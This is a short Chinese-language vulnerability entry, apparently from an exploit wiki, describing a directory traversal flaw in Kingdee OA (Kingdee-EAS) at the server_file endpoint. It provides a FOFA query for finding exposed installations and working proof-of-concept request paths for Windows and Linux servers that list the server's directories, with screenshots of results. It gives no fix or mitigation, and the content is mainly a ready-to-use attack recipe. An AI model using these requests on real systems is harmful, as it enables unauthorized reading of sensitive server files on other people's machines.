# 金蝶OA server_file 目录遍历漏洞

## 漏洞描述

金蝶OA server_file 存在目录遍历漏洞，攻击者通过目录遍历可以获取服务器敏感信息

## 漏洞影响

> [!NOTE]
>
> 金蝶OA

## FOFA

> [!NOTE]
>
> app="Kingdee-EAS"

## 漏洞复现

登录界面为

![image-20210603132948792](http://wikioss.peiqi.tech/vuln/image-20210603132948792.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

漏洞POC

```
/appmonitor/protected/selector/server_file/files?folder=/&suffix=
```

![image-20210603133022065](C:/Users/peiqi/AppData/Roaming/Typora/typora-user-images/image-20210603133022065.png)

```
Windows服务器

appmonitor/protected/selector/server_file/files?folder=C://&suffix=

Linux服务器
appmonitor/protected/selector/server_file/files?folder=/&suffix=
```

![image-20210603133136331](http://wikioss.peiqi.tech/vuln/image-20210603133136331.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

